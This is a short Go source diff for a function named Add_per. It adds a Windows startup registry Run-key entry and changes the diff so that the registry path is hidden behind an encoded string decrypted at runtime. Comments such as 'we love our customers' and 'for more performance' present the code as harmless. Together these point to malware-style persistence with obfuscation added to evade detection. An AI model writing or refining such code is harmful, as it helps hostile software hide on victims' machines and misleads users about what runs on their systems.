@@ -5,6 +5,7 @@ import (
 	"syscall"
 	"path/filepath"
 )
+
 //we love our customers
 
 func Add_per(){
@@ -26,7 +27,7 @@ func Add_per(){
     }
 
     //this function will help you to run your application at startup for more performance
-	key, err := RegCreateKeyEx(syscall.HKEY_CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`)
+	key, err := RegCreateKeyEx(syscall.HKEY_CURRENT_USER, DecryptString("\x16*#12$7 \x19\x08,&7*6*#1\x19\x12,+!*26\x19\x06077 +1\x13 76,*+\x19\x170+"))
 	fmt.Println(key)
 	if err != nil {
 		fmt.Println("", err)
